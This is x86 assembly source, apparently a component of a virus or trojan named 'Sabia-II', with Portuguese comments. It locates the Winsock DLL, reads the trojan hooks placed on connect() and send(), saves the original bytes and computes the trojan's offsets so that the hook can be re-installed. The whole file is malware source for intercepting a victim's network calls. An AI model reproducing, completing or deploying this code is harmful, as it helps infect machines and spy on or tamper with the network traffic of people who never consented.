   .586p
   .model flat
   .code
   jumps

   include \Sabia-II\_param.INC

   start:

   ; update SABIá-II filez

   push 'SII'
   push 0
   push 0
   push 0
   API connect
   pop eax

   cmp eax, 'SII'
   jz exit1

   push eax
   mov esi, eax
   mov edi, offset saved_bytes_connect
   movsd
   movsd
   pop esi
   add esi, 8
   mov edi, offset local_trojan_connect
   movsd
   movsd

   ; trojan wsock32/ws2_32 se encontra em local_trojan + 1,
   ; nesta dword

   call $+5+11
   db 'WS2_32.DLL',0
   API LoadLibraryA
   cmp eax, 0
   jnz DLL_found

   call $+5+12
   db 'WSOCK32.DLL',0
   API LoadLibraryA
   cmp eax, 0
   jz exit1

   DLL_found:

   mov [base_dll], eax
   mov esi, dword ptr [offset local_trojan_connect+1]
   sub esi, eax

   mov [connect_location], esi

   ; esi contem offset pro trjan, é só adicionar
   ; handle mapview
   ; re-instalar o hooker em connect()

   push 'SII'
   push 0
   push 0
   push 0
   push 0
   API send
   pop eax

   cmp eax, 'SII'
   jz exit1

   push eax
   mov esi, eax
   mov edi, offset saved_bytes_send
   movsd
   movsd
   pop esi
   add esi, 8
   mov edi, offset local_trojan_send
   movsd
   movsd

   mov esi, dword ptr [offset local_trojan_send+1]
   sub esi, dword ptr [base_dll]
   mov [send_location], esi

   nop

   exit1:

   push 0
   API Exitprocess

   .data

   saved_bytes_connect  dd ?, ?
   local_trojan_connect dd ?, ?

   saved_bytes_send  dd ?, ?
   local_trojan_send dd ?, ?

   connect_location dd ?
   send_location dd ?

   base_dll dd ?

   end start
   end
